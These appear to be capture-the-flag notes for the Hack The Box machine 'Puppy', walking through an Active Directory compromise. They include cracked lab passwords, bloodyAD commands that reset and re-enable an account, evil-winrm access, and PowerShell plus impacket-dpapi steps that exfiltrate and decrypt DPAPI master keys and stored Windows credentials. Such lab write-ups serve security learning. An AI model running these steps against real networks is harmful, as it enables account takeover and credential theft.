1. add james to developers group
2. access dev share
3. crack keepass recovery db password (with fresh john and keepass2john)
- Adam (adam.silver) HJKL2025!
- Anthony (ant.edwards): Antman2025!
- Jamie: JamieLove2025!
- Sam: ILY2025!
- Steve: Steve2025!

4. check bloodhound and find out that: 
- jamie has no hvt
- adam is a disabled member of remote management group (winrm) with 9 hvt and AdminCount = true
- anthony has 9 hvt (through adam) but AdminCount set to false with delegated genericall on adam through senior devs group

so the logic path is: anthony -> adam -> admin  with jamie being useless

5. reset adam password (take ownership before)
bloodyAD --host 10.129.232.75 -d Puppy.htb -u ant.edwards -p Antman2025! set password adam.silver NewPassword123!

6. enable adam account
bloodyAD -d Puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.129.232.75 set object adam.silver userAccountControl -v 512

7.evil-winrm with adam, get user flag and winpeas with no info

8. look at other interesting ad objects in bloodhound
- steph.cooper_adm -> first degree local admin and member of admin group and puppy admins ou
- steph.cooper -> regular account in puppy admins ou with CanPSRemote (winrm) permission

9. looking at the password pattern, try: Stephen2025! and Steph2025! but no success

10. in C:\Backups directory, we find and download: site-backup-2024-12-30.zip
Inside, we find nms-auth-config.xml.bak with password for steph.cooper: ChefSteph2025!

11. we connect with steph and run winPEAS again but no luck

12. we run powerview and powerup with no luck

13. we try seatbelt and we find windows credentials data

Folder : C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\

Local Credential Data
FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
MasterKey    : 556a2412-1275-4ccf-b721-e6a0b4f90407

Enterprise Credential Data
Folder : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
FileName     : C8D69EBE9A43E9DEBF6B5FBD48B521B9
MasterKey    : 556a2412-1275-4ccf-b721-e6a0b4f90407

14. we try to use SharpDPAPI to decrypt the windows credentials data and DPAPISnoop to output crackable hash but we get the CryptProtectData error
.\SharpDPAPI.exe triage /password:ChefSteph2025!
.\DPAPISnoop.exe

15. since SharpDPAPI and DPAPISnoop didn't work, we try impacket-dpapi next.
But first, we need to copy the master keys and windows credentials to our machine.

# List master keys
ls -Force C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\

If we try to download the file directly using Evil-WinRM, we get an error, so we need to convert it to base64 first

# Save master key as variable
$key = "556a2412-1275-4ccf-b721-e6a0b4f90407"

# Get master key file as bytes
$fileBytes = [System.IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\$key")

# Convert bytes to base64
$base64String = [Convert]::ToBase64String($fileBytes)

# Write the base64 to a file
[System.IO.File]::WriteAllText("C:\Users\steph.cooper\$key.txt", $base64String, [System.Text.Encoding]::ASCII)

# Download the base64 master key file with Evil-WinRM
$base64file = "C:\Users\steph.cooper\" + $key + ".txt"
download $base64file

16. we then decode the base64 master key file on our linux host
base64 -d 556a2412-1275-4ccf-b721-e6a0b4f90407.txt > 556a2412-1275-4ccf-b721-e6a0b4f90407

17. we can reuse the powershell same logic for the credentials file at:
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

18. now we can decrypt the master key using impacket-dpapi
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

19. once that's done, we can decrypt the windows credential file
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
